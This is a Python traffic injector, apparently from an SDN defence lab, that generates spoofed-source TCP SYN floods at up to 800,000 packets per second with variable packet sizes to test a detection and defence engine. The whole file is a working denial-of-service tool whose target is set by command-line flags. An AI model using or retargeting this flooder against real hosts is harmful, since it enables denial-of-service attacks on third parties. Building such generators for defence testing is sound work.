"""Self-Defending SDN Tower - 고속 가변 BPP / 가변 PPS 트래픽 주입기.

패킷 크기(BPP: 54B ~ 1500B)와 초당 패킷 수(PPS: 최대 80만 PPS)를 가변하여
SDN 관제탑 및 AI 탐지/방어 엔진의 거동을 시연·검증합니다.
"""

from __future__ import annotations

import argparse
import multiprocessing
import os
import random
import socket
import sys
import time
from typing import Any, List

from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether


def generate_packet_pool(
    pool_size: int,
    min_bpp: int,
    max_bpp: int,
    dst_ip: str,
    dst_port: int,
    smac: str,
    dmac: str,
) -> List[bytes]:
    """가변 패킷 크기(BPP) 및 랜덤 스푸핑 IP를 적용한 원시 패킷 바이트 풀 생성."""
    pool: List[bytes] = []
    # Ethernet (14) + IP (20) + TCP (20) = 기본 54 bytes
    base_headers_len = 54

    for _ in range(pool_size):
        # 목표 총 패킷 크기 (min_bpp ~ max_bpp)
        target_size = random.randint(max(base_headers_len, min_bpp), max_bpp)
        payload_len = target_size - base_headers_len
        payload = os.urandom(payload_len) if payload_len > 0 else b""

        # 랜덤 공인 IP (11.0.0.0 ~ 220.255.255.254)
        src_ip = (
            f"{random.randint(11, 220)}.{random.randint(0, 255)}."
            f"{random.randint(0, 255)}.{random.randint(1, 254)}"
        )
        sport = random.randint(1024, 65535)

        pkt = (
            Ether(src=smac, dst=dmac)
            / IP(src=src_ip, dst=dst_ip)
            / TCP(sport=sport, dport=dst_port, flags="S")
            / payload
        )
        pool.append(bytes(pkt))

    return pool


def _worker_blast(
    iface: str,
    pool: List[bytes],
    pps_quota: int,
    duration: float,
    counter: Any,
    random_pps: bool = False,
) -> None:
    """AF_PACKET raw socket을 이용해 지정된 인터페이스로 패킷 전송."""
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((iface, 0))
    except Exception as e:
        print(f"[Worker Error] Socket bind failed on {iface}: {e}", file=sys.stderr)
        return

    pool_len = len(pool)
    end_time = time.monotonic() + duration
    sent_count = 0
    idx = random.randint(0, pool_len - 1)

    current_quota = pps_quota
    next_jitter_time = time.monotonic()

    while time.monotonic() < end_time:
        now = time.monotonic()
        if random_pps and now >= next_jitter_time:
            # 1초마다 목표 PPS를 10만 ~ pps_quota 사이에서 무작위 변동
            min_quota = max(10000, pps_quota // 8)
            current_quota = random.randint(min_quota, pps_quota)
            next_jitter_time = now + random.uniform(0.5, 2.0)

        batch_size = max(1, min(200, current_quota // 50))
        interval = (batch_size / current_quota) if current_quota < 500000 else 0.0

        t0 = time.monotonic()
        for _ in range(batch_size):
            try:
                s.send(pool[idx % pool_len])
                idx += 1
                sent_count += 1
            except Exception:
                pass

        if interval > 0.0:
            elapsed = time.monotonic() - t0
            rem = interval - elapsed
            if rem > 0.0:
                time.sleep(rem)

    with counter.get_lock():
        counter.value += sent_count
    s.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="가변 BPP & 고속 PPS 트래픽 발생기")
    parser.add_argument("--iface", default="h_attacker-eth1", help="전송 네트워크 인터페이스")
    parser.add_argument("--dst", default="10.0.0.4", help="목적지 IP (H_server)")
    parser.add_argument("--dport", type=int, default=80, help="목적지 포트")
    parser.add_argument("--duration", type=float, default=10.0, help="전송 지속 시간(초)")
    parser.add_argument("--target-pps", type=int, default=800000, help="목표 최대 초당 패킷수 (PPS)")
    parser.add_argument("--min-bpp", type=int, default=54, help="최소 패킷 크기 (Bytes)")
    parser.add_argument("--max-bpp", type=int, default=1500, help="최대 패킷 크기 (Bytes)")
    parser.add_argument("--workers", type=int, default=4, help="워커 프로세스 수")
    parser.add_argument("--smac", default="00:00:00:00:00:02", help="출발지 MAC (h_attacker)")
    parser.add_argument("--dmac", default="00:00:00:00:00:04", help="도착지 MAC (h_server)")
    parser.add_argument("--random-pps", action="store_true", help="목표 PPS를 동적으로 무작위 변동")
    args = parser.parse_args()

    print(
        f"🚀 [traffic_variable_blaster] 시작: "
        f"인터페이스={args.iface}, 지속시간={args.duration}s, 목표PPS={args.target_pps:,} (랜덤변동={args.random_pps}), "
        f"BPP 범위={args.min_bpp}~{args.max_bpp}B, 워커수={args.workers}"
    )

    # 1. 패킷 풀 사전 생성
    pool_size = 512
    pool = generate_packet_pool(
        pool_size=pool_size,
        min_bpp=args.min_bpp,
        max_bpp=args.max_bpp,
        dst_ip=args.dst,
        dst_port=args.dport,
        smac=args.smac,
        dmac=args.dmac,
    )

    pps_per_worker = max(1, args.target_pps // max(1, args.workers))
    total_sent = multiprocessing.Value("i", 0)

    # 2. 멀티프로세스 전송 실행
    start_time = time.monotonic()
    procs = [
        multiprocessing.Process(
            target=_worker_blast,
            args=(args.iface, pool, pps_per_worker, args.duration, total_sent, args.random_pps),
        )
        for _ in range(args.workers)
    ]

    for p in procs:
        p.start()
    for p in procs:
        p.join()

    elapsed = time.monotonic() - start_time
    actual_pps = total_sent.value / elapsed if elapsed > 0 else 0
    print(
        f"✅ [traffic_variable_blaster] 전송 완료: "
        f"총 {total_sent.value:,} 패킷, 실제 소요={elapsed:.2f}s, 평균 전송률={actual_pps:,.0f} PPS"
    )


if __name__ == "__main__":
    main()
